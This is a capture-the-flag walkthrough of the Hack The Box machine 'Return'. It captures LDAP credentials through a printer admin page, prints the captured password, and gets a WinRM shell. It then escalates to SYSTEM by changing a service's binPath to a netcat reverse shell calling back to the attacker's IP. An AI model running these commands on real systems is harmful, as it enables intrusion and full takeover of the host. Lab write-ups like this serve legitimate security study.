---
date: 2025-02-27
categories: [CTF, HTB]
title: "HTB - Printer Exploitation Track - Return"
tags: ['printer', 'pjl', 'pret']

description: "Printer Exploitation Track - - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Printer Exploitation Track - Return

NMAP

![image1](../resources/a485efe65dc84739a96132edb84ecf56.png)
 

![image2](../resources/053102acbb3e48238b9bc5576dc43329.png)

Add return.local to /etc/hosts

- Port 80 has a Printer admin page

![image3](../resources/5e7b0c3fc4074a10baada13de954c0ab.png)
- I tried to change the password but it didn't work:

![image4](../resources/359038ff22484e58b445df295b414957.png)

- Then I set up a listener on port 389 and change the Server Address to my tun0:

![image5](../resources/d6d2b94dae3641308fe4689e77948afd.png)


![image6](../resources/7ccc9d61b90647e0a989edb5ec87ca3a.png)

**1edFg43012!!**

- And we have valid creds:

![image7](../resources/7b0731136d2c4fc994506ef8895d1fbb.png)

- Shell with winrm:

![image8](../resources/87a0f29c85014707af0047fbead7523c.png)


![image9](../resources/4f72937c07074628b4897d7214cd044f.png)


![image10](../resources/718e5be9fd7941af86182fe2fe17bb6a.png)


![image11](../resources/f86210aed03448c6bd196ccf175534e9.png)

Modify a service path

- Evil-WinRM has services built in:

![image12](../resources/3147b88ac7384e01b4a59fd50895210e.png)

- We'll choose the VMTools service (as it has privileges) and configure the binary it points to:
```bash
sc.exe config VMTools binPath= "C:\Users\svc-printer\Documents\nc.exe -e C:\WINDOWS\System32\cmd.exe 10.10.14.40 9001"

```

![image13](../resources/c2488860a47f453a825ffa64f802e8a8.png)

- Set up a listener:
```bash
rlwrap -cAr nc -lvnp 9001

```
- Now we stop and start the service with:
```bash
sc.exe stop VMTools

sc.exe start VMTools

```

![image14](../resources/ee6b5b9bf4b34937ba9fa1e96add18a6.png)

- Shell as system:

![image15](../resources/86192510452d44f0bed4ab7f1f2d438e.png)

```bash
type root.txt

```